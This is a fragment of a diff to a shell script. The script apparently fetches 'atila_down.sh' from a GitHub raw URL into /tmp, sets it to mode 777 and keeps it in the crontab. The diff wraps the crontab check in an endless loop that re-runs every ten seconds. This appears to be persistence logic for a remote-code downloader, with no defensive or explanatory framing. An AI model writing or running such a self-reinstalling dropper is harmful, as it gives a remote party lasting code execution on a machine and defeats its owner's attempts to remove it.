@@ -7,6 +7,15 @@ install_url='https://github.com/atilabyte/golang/raw/refs/heads/master/scripts/i
 
 
 
+
+while true ; do 
+
+
+
+sleep 10
+
+
+
 if crontab -l 2>/dev/null | grep -q "atila_down.sh"; then
 
 
@@ -32,5 +41,9 @@ cd /tmp ; chmod 777 atila_down.sh
     
 
 fi
+
+
+done
+
 
 
